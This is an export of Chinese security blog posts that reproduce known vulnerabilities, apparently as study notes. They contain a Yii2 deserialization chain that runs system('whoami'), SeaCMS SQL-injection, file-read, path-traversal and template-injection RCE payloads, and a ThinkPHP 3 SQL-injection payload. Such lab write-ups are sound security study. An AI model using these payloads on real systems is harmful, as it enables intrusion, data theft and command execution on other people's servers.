class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">phpDocumentor</span>\<span class="hljs-title">Reflection</span>\<span class="hljs-title">DocBlock</span>\<span class="hljs-title">Tags</span>\<span class="hljs-title">Deprecated</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Swift_KeyCache_DiskKeyCache</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">private</span> $key = [];<br>        <span class="hljs-keyword">private</span> $path;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;path = <span class="hljs-keyword">new</span> Deprecated();<br>            <span class="hljs-keyword">$this</span>-&gt;keys = <span class="hljs-keyword">array</span>(<br>                <span class="hljs-string">&#x27;hello&#x27;</span> =&gt; <span class="hljs-string">&#x27;world&#x27;</span><br>            );<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">phpDocumentor</span>\<span class="hljs-title">Reflection</span>\<span class="hljs-title">DocBlock</span>\<span class="hljs-title">Tags</span>&#123;<br><br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Deprecated</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> $description;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;description = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> $formatters;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;render&#x27;</span>] = [<span class="hljs-keyword">new</span> IndexAction(), <span class="hljs-string">&#x27;run&#x27;</span>];<br>        &#125;<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span><br>    &#123;<br>        <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__construct</span>()<br>        &#123;<br>            $this-&gt;checkAccess = &#x27;system&#x27;;<br>            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;whoami&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> &#123;<br>    <span class="hljs-title">echo</span> <span class="hljs-title">base64_encode</span>(<span class="hljs-title">serialize</span>(<span class="hljs-title">new</span> <span class="hljs-title">Swift_KeyCache_DiskKeyCache</span>()));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028133701106.png" alt="image-20211028133701106"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于反序列化链的挖掘需要先找到入口点比如<code>__destruct()</code> 和 <code>__wakeup()</code>，然后再逐步往后推找到一条完整的链，最终构造一条完整的利用链。看着容易自己找的话还是很有难度的。</p><p>参考文章</p><p><a href="https://so4ms.top/index.php/2021/07/06/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://so4ms.top/index.php/2021/07/06/yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p><p><a href="https://jelly0930.github.io/2021/09/yii2/">https://jelly0930.github.io/2021/09/yii2/</a></p><p><a href="https://v0w.top/2020/09/22/Yii2unserialize/">https://v0w.top/2020/09/22/Yii2unserialize/</a></p><p><a href="https://ca01h.top/code_audit/PHP/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95/">https://ca01h.top/code_audit/PHP/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95/</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SeaCMS 代码审计</title>
    <link href="/2021/10/27/SeaCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2021/10/27/SeaCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="SeaCMS-代码审计"><a href="#SeaCMS-代码审计" class="headerlink" title="SeaCMS 代码审计"></a>SeaCMS 代码审计</h1><h2 id="网站环境搭建"><a href="#网站环境搭建" class="headerlink" title="网站环境搭建"></a>网站环境搭建</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211024131021167.png" alt="image-20211024131021167"></p><h2 id="全局分析"><a href="#全局分析" class="headerlink" title="全局分析"></a>全局分析</h2><h3 id="前端入口-index-php"><a href="#前端入口-index-php" class="headerlink" title="前端入口 index.php"></a>前端入口 <code>index.php</code></h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211025231649167.png" alt="image-20211025231649167"></p><blockquote><p>吐槽一下是不是我下载到盗版的源码了怎么改的代码直接注释而不是删除啊</p></blockquote><p>使用 <code>echoIndex()</code> 函数来完成页面打印的操作</p><p>在 <code>include/common.php</code> 中定义了一些初始化操作和安全过滤方法，还包含了一些有安全过滤功能的文件等</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211025232148895.png" alt="image-20211025232148895"></p><h3 id="后端入口-admin-index-php"><a href="#后端入口-admin-index-php" class="headerlink" title="后端入口 admin/index.php"></a>后端入口 <code>admin/index.php</code></h3><p>后端入口文件的内容比较少，主要靠包含其他文件实现功能</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211025233957441.png" alt="image-20211025233957441"></p><p><code>admin/config.php</code> 中有检测用户是否登录的功能还有一堆其他获取信息的函数</p><p><code>admin/templets</code> 中存储的是后端页面模板</p><blockquote><p>源码就总体简单看了一下，不是特别熟练看了也没有谱，还得多练习</p></blockquote><h2 id="漏洞复现与分析"><a href="#漏洞复现与分析" class="headerlink" title="漏洞复现与分析"></a>漏洞复现与分析</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="前台"><a href="#前台" class="headerlink" title="前台"></a>前台</h4><p>payload:<code>/comment/api/index.php?gid=1&amp;page=2&amp;rlist[]=extractvalue(1,concat_ws(0x7e,user(),database()))</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211025000812531.png" alt="image-20211025000812531"></p><p>漏洞产生的点</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026002329021.png" alt="image-20211026002329021"></p><p>这里的 <code>$type</code> 和 <code>$ids</code> 都没有利用单引号包裹</p><p><code>$type</code> 利用之前的 <code>is_numeric()</code> 函数检测了类型，所以不能使用字符串</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026112501752.png" alt="image-20211026112501752"></p><p>搜先是执行到一个 <code>if</code> 语句判断 <code>$page</code> 是否大于2,如果大于二就跳过执行后面</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026113502092.png" alt="image-20211026113502092"></p><p>我们需要执行到 <code>ReadData()</code> 函数，在该函数中需要 <code>$id &gt; 0</code> 才可以执行到 <code>ReadrList()</code> 函数中，并且 <code>$x</code> 为 <code>implode(&#39;,&#39; , $rlist)</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026113912958.png" alt="image-20211026113912958"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026113613051.png" alt="image-20211026113613051"></p><p>满足上面的条件后就可以使用 <code>Readrlist()</code> 函数，这里的 <code>$ids</code> 就是 <code>$x</code> 的值，所以我们可以控制 <code>$rlist</code> 的值来实现控制 <code>$ids</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026114030690.png" alt="image-20211026114030690"></p><p>总结一下要执行到漏洞语句这里需要的条件</p><ol><li><code>$page &gt; 2</code></li><li><code>$id &gt; 0</code> 也就是 <code>$gid</code></li><li><code>$rlist</code> 为数组</li></ol><p>构造的语句的时候还需要注意绕过过滤，一下是过滤文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026121200334.png" alt="image-20211026121200334"></p><p>绕过里面包含了一些常见的 XSS SQL 等</p><h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p>发现一个类似于目录遍历的点，但是直接利用不行，所以查看一下源码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026132733737.png" alt="image-20211026132733737"></p><p>源码很容易绕过，保证0到11的字母是 <code>../templets/</code> 即可</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026133031797.png" alt="image-20211026133031797"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026133128656.png" alt="image-20211026133128656"></p><p>可以执行任意文件删除了</p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>在<code>admin/templets/admin_collect_ruleadd2.htm</code>中有文件读取的操作</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026140130062.png" alt="image-20211026140130062"></p><p>读取的目标是 <code>$siteurl</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026140829070.png" alt="image-20211026140829070"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026140852762.png" alt="image-20211026140852762"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/admin/admin_collect_news.php</span> HTTP/1.1<br><span class="hljs-attribute">Host</span>: 192.168.148.172<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<br><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36<br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Referer</span>: http://192.168.148.172/admin/<br><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<br><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span>: PHPSESSID=fm1vheb6hm439qqhktpbpecro3<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span>: 72<br><br>action=addrule&amp;step=2&amp;itemname=1&amp;siteurl=file://C:/test/1.txt&amp;showcode=1<br></code></pre></td></tr></table></figure><p>GET POST 都可以</p><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-comment">// payload1</span><br>http:<span class="hljs-comment">//ip/search.php</span><br>POST: searchtype=<span class="hljs-number">5</span>&amp;order=&#125;&#123;end <span class="hljs-keyword">if</span>&#125; &#123;<span class="hljs-keyword">if</span>:<span class="hljs-number">1</span>)phpinfo();<span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>&#125;&#123;end <span class="hljs-keyword">if</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026231934858.png" alt="image-20211026231934858"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">// payload2<br><br>POST:<br>searchtype=5&amp;order=&#125;&#123;end if&#125;&#123;if:1)$<span class="hljs-emphasis">_POST[<span class="hljs-string">func</span>](<span class="hljs-link">$_POST[cmd]</span>);if(1&#125;&#123;end if&#125;&amp;func=system&amp;cmd=whoami</span><br><span class="hljs-emphasis">searchtype=5&amp;order=&#125;&#123;end if&#125;&#123;if:1)$_</span>POST[<span class="hljs-string">func</span>](<span class="hljs-link">$_POST[cmd]</span>);//&#125;&#123;end if&#125;&amp;func=system&amp;cmd=whoami<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026232316527.png" alt="image-20211026232316527"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211026232338978.png"></p><p>直接跟着 payload 走一遍</p><p>POST 传入数据后，<code>$searchtype</code> 需要为 5 才能进入这个选择，后面的 <code>$order</code> 会被替换进 <code>$content</code> 中加入后续的执行</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027002348054.png" alt="image-20211027002348054"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027004534871.png" alt="image-20211027004534871"></p><p>这样就可以执行命令了，payload 就是依靠闭合语句实现命令的执行</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027005417801.png" alt="image-20211027005417801"></p><p>主要还是对参数的过滤不到位</p><p>payload 的构造 <code>$order=&#125;&#123;end if&#125; &#123;if:1)phpinfo();if(1&#125;&#123;end if&#125;</code></p><p>首先第一个<code>&#125;</code>是为了闭合之前的，然后使用 <code>&#123;if: </code> 这样才能进入 <code>@eval()</code> 这个函数执行，使用 <code>&#123;end if&#125;</code> 就是执行 <code>if</code> 选择使他能够执行到后面的语句</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027010247159.png" alt="image-20211027010247159"></p><p>这个漏洞感觉要直接挖出来还是比较难的，但是原理感觉不是特别难，就是字符串拼接导致命令执行了，希望有一天我也可以挖到 RCE 啊！！！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于代码审计还是需要结合功能点和代码一起审计，这样才效率才会比较，然后再结合所有代码看一遍，这样才能实现漏洞的深度挖掘。</p><p>参考文章</p><p><a href="https://nikoeurus.github.io/2019/04/03/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-seacms%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%886.45%E5%90%8E%E7%BB%AD%E7%89%88%E6%9C%AC%EF%BC%89/#seacms-6-61">https://nikoeurus.github.io/2019/04/03/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-seacms%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%886.45%E5%90%8E%E7%BB%AD%E7%89%88%E6%9C%AC%EF%BC%89/#seacms-6-61</a></p><p><a href="https://jelly0930.github.io/2021/09/seacms/">https://jelly0930.github.io/2021/09/seacms/</a></p><p><a href="https://www.cnblogs.com/ffx1/p/12653597.html">https://www.cnblogs.com/ffx1/p/12653597.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TP3代码审计</title>
    <link href="/2021/10/23/TP3%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2021/10/23/TP3%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="ThinkPHP-3"><a href="#ThinkPHP-3" class="headerlink" title="ThinkPHP 3"></a>ThinkPHP 3</h1><h2 id="框架学习"><a href="#框架学习" class="headerlink" title="框架学习"></a>框架学习</h2><blockquote><p>ThinkPHP 3.2.3</p></blockquote><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">www</span>  <span class="hljs-selector-tag">WEB</span>部署目录（或者子目录）<br>├─<span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span>       入口文件<br>├─<span class="hljs-selector-tag">README</span><span class="hljs-selector-class">.md</span>       <span class="hljs-selector-tag">README</span>文件<br>├─<span class="hljs-selector-tag">Application</span>     应用目录<br>├─<span class="hljs-selector-tag">Public</span>          资源文件目录<br>└─<span class="hljs-selector-tag">ThinkPHP</span>        框架目录<br></code></pre></td></tr></table></figure><p>框架目录ThinkPHP的结构</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">├─ThinkPHP 框架系统目录（可以部署在非web目录下面）<br>│  ├─Common       核心公共函数目录<br>│  ├─Conf         核心配置目录 <br>│  ├─Lang         核心语言包目录<br>│  ├─Library      框架类库目录<br>│  │  ├─Think     核心Think类库包目录<br>│  │  ├─Behavior  行为类库目录<br>│  │  ├─Org       Org类库包目录<br>│  │  ├─Vendor    第三方类库目录<br>│  │  ├─<span class="hljs-operator"> ...      </span>更多类库目录<br>│  ├─Mode         框架应用模式目录<br>│  ├─Tpl          系统模板目录<br>│  ├─<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LICENSE</span>.</span></span>txt  框架授权协议文件<br>│  ├─logo.png     框架LOGO文件<br>│  ├─<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">README</span>.</span></span>txt   框架README文件<br>│  └─<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ThinkPHP</span>.</span></span>php 框架入口文件<br></code></pre></td></tr></table></figure><p>下面是官方建议</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210925220346848.png" alt="image-20210925220346848"></p><p>试了一下如果默认这么放的话，可以读取到其他文件中的内容，比如日志</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210925220511043.png" alt="image-20210925220511043"></p><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>ThinkPHP 的默认配置文件定义格式均采用返回 PHP 数组的格式</p><p>配置的加载顺序是：<strong>惯例配置-&gt;应用配置-&gt;模式配置-&gt;调试配置-&gt;状态配置-&gt;模块配置-&gt;扩展配置-&gt;动态配置</strong></p><p><strong>配置的读取</strong></p><p>C（config）方法，读取已有的配置</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk">C(<span class="hljs-string">&#x27;URL_MODEL&#x27;</span>); <span class="hljs-regexp">//</span> 读取URL模式配置参数，如果未配置则会返回 NULL<br>参数名称不能含有 . 和特殊字符<br><br>C(<span class="hljs-string">&#x27;my_config&#x27;</span>,null,<span class="hljs-string">&#x27;default_config&#x27;</span>); <span class="hljs-regexp">//</span> 如果my_config尚未设置的话，则返回default_config字符串<br><br>C(<span class="hljs-string">&#x27;USER_CONFIG.USER_TYPE&#x27;</span>); <span class="hljs-regexp">//</span>读取二维配置，获取用户配置中的用户类型设置<br><br>动态配置<br>C(<span class="hljs-string">&#x27;DATA_CACHE_TIME&#x27;</span>,<span class="hljs-number">60</span>); <span class="hljs-regexp">//</span> 动态改变缓存有效期<br>动态配置赋值仅对当前请求有效，不会对以后的请求造成影响。<br><br>二维配置<br><span class="hljs-regexp">//</span> 获取已经设置的参数值<br>C(<span class="hljs-string">&#x27;USER_CONFIG.USER_TYPE&#x27;</span>);<br><span class="hljs-regexp">//</span> 设置新的值<br>C(<span class="hljs-string">&#x27;USER_CONFIG.USER_TYPE&#x27;</span>,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p><strong>架构</strong></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210926135357258.png" alt="image-20210926135357258"></p><blockquote><p>ThinkPHP 框架的 URL 是区分大小写的</p><p><code>&#39;URL_CASE_INSENSITIVE&#39; =&gt; true</code> 设置为 True 表示不区分大小写</p></blockquote><p>D 方法，实例化对象</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">D</span><span class="hljs-params">(<span class="hljs-string">&#x27;User&#x27;</span>)</span></span>  <span class="hljs-comment">// 实例化 UserModel</span><br><span class="hljs-function"><span class="hljs-title">D</span><span class="hljs-params">(<span class="hljs-string">&#x27;User&#x27;</span>,<span class="hljs-string">&#x27;Logic&#x27;</span>)</span></span> <span class="hljs-comment">// 实例化 UserLogic</span><br><span class="hljs-function"><span class="hljs-title">D</span><span class="hljs-params">(<span class="hljs-string">&#x27;User&#x27;</span>,<span class="hljs-string">&#x27;Service&#x27;</span>)</span></span> <span class="hljs-comment">// 实例化 UserService</span><br></code></pre></td></tr></table></figure><p><strong>控制器</strong></p><p>I 方法是 ThinkPHP 中获取系统输入变量的，可以用于任何地方</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">I(<span class="hljs-string">&#x27;变量类型.变量名/修饰符&#x27;</span>,[<span class="hljs-string">&#x27;默认值&#x27;</span>],[<span class="hljs-string">&#x27;过滤方法或正则&#x27;</span>],[<span class="hljs-string">&#x27;额外数据源&#x27;</span>])<br>I(<span class="hljs-string">&#x27;get.id&#x27;</span>); <span class="hljs-regexp">//</span> 等价于 <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]<br>I(<span class="hljs-string">&#x27;get.id&#x27;</span>,<span class="hljs-number">0</span>); <span class="hljs-regexp">//</span> 如果不存在 <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] 就返回 <span class="hljs-number">0</span><br>I(<span class="hljs-string">&#x27;get.name&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;htmlspecialchars&#x27;</span>); <span class="hljs-regexp">//</span> 使用 htmlspecialchars 过滤，如果没有就返回空<br></code></pre></td></tr></table></figure><p><strong>模型</strong></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gams">模型实例化<br><span class="hljs-number">1.</span> <span class="hljs-symbol">$</span>user = new \Home\<span class="hljs-keyword">Model</span>\UserModel();<br><span class="hljs-number">2.</span> <span class="hljs-symbol">$</span>user = D(<span class="hljs-string">&#x27;User&#x27;</span>);<br>如果只对数据表进行基本的 CURD 操作，使用 M 方法的可能性会更高一点<br>   <span class="hljs-symbol">$</span>User = M(<span class="hljs-string">&#x27;User&#x27;</span>); <span class="hljs-comment">// $User = new \Think\Model(&#x27;User&#x27;)</span><br>   <span class="hljs-symbol">$</span>User-&gt;select()<br><span class="hljs-number">3.</span> 实例化空模型<br><span class="hljs-symbol">$</span><span class="hljs-keyword">Model</span> = new  <span class="hljs-keyword">Model</span>();<br><span class="hljs-symbol">$</span><span class="hljs-keyword">Model</span> = M(); <span class="hljs-comment">// 与上面等价</span><br><span class="hljs-symbol">$</span><span class="hljs-keyword">Model</span>-&gt;query(<span class="hljs-string">&#x27;SELECT * FROM think_user WHERE status = 1&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>数据库操作</strong></p><blockquote><p>ThinkPHP 3 模型基础类 Model 类提供了很多操作数据库的方法</p></blockquote><p><code>where()</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">where</span> 方法的参数支持的字符串和数组，主要用于获取 <span class="hljs-keyword">SQL</span> 语句的 <span class="hljs-keyword">where</span> 部分<br></code></pre></td></tr></table></figure><p><code>select()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">获取数据表中的多行记录<br></code></pre></td></tr></table></figure><p><code>find()</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">获取数据表中的一行数据<br></code></pre></td></tr></table></figure><p><strong>安全过滤机制</strong></p><blockquote><p>ThinkPHP 3 的 I 方法和数据库操作时都会提供一个自动安全过滤的操作</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">&#x27;DEFAULT_FILTER&#x27;</span>        =&gt;  <span class="hljs-string">&#x27;htmlspecialchars&#x27;</span>, <span class="hljs-regexp">//</span> 默认参数过滤方法 用于I函数...<br></code></pre></td></tr></table></figure><p>但是 ThinkPHP3.2.3 中敏感字符不包含 BIND，因此这里就存在一个 SQL 注入的风险</p><h2 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h2><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><h5 id="where-注入"><a href="#where-注入" class="headerlink" title="where 注入"></a>where 注入</h5><p>环境配置</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210926153619171.png" alt="image-20210926153619171"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210926151434094.png" alt="·"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210926153052777.png" alt="image-20210926153052777"></p><p><strong>where注入</strong></p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?id[where]=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=updatexml(1,concat(0x7e,(select passwd <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>limit 1),0x7e),1)%23<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210926153659388.png" alt="image-20210926153659388"></p><p>成功产生报错注入</p><p><strong>原理分析</strong></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928194920426.png" alt="image-20210928194920426"></p><p>首先传入 <code>id=1&#39;</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928160906064.png" alt="image-20210928160906064"></p><p><code>I()</code> 方法获取参数，并且使用默认的 <code>htmlspecialchars()</code> 过滤参数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928161423771.png" alt="image-20210928161423771"></p><p><code>htmlspecialchars()</code> 将特殊的字符转换为 HTML 实体</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928161715938.png" alt="image-20210928161715938"><br><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928183704166.png" alt="image-20210928183704166"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210926155823448.png" alt="image-20210926155823448"></p><p><code>is_array()</code> 判断数据是不是数组，<code>array_walk_recursive()</code> 对数组的所有元素递归的应用用户函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210928164612358.png" 